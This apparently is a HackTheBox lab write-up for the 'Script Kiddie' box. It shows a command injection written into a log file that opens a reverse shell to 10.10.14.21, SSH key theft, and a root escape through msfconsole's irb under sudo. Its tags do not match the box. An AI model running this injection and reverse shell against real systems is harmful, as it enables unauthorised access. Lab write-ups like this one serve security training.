---
title: (HTB) - Script Kiddie
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-09-22 11:33:00 +0200
categories: [HackTheBox, Other]
tags: [NetBSD,Bozohttpd,Lua,Default Credentials,Code Injection,NGINX,Password Cracking,Password Reuse,Weak Credentials]
math: true
mermaid: true
image:
  src: /assets/images/1df44abad6a5755b7f9edd7675bbca3622df01287e2eeec05216dca208d4e0bc.png
  width: 694
  height: 515
  alt: image alternative text
---
**Script Kiddie is an easy box where we first have to exploit a vulnerable MSFvenom template** 


# ENUMERATION

## NMAP

# EXPLOITATION

![picture 21](/assets/images/57b2b3ec41b8f3813882210be6efb5d17a3eac1a39c0e05de1a01439633a8693.png)

Using metasploit

![picture 22](/assets/images/8ede237222b9c4ccf385ec9520c8cd4e13ff97bec7a4315f37995f9f585e25c2.png)

```
kid@scriptkiddie:~/html$ id
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

id_rsa private key can be downloaded for ssh

# PRIVILEGE ESCALATION

```
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

```
2021/02/07 09:26:01 CMD: UID=0    PID=1257893 | /usr/sbin/CRON -f 
2021/02/07 09:26:01 CMD: UID=0    PID=1257894 | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 
2021/02/07 09:28:01 CMD: UID=0    PID=1257896 | /usr/sbin/CRON -f 
```

```
kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/9999 0>&1' #" >> hackers
```

![picture 23](/assets/images/ec1df5b4861ac839fa1bb9ef1da7c5e237ca15642ad57650b3cdcd4e36f9e792.png)

get .ssh/id_rsa and connect with ssh

```
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

```
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> exec '/bin/bash'
root@scriptkiddie:/home/pwn# id
uid=0(root) gid=0(root) groups=0(root)
```

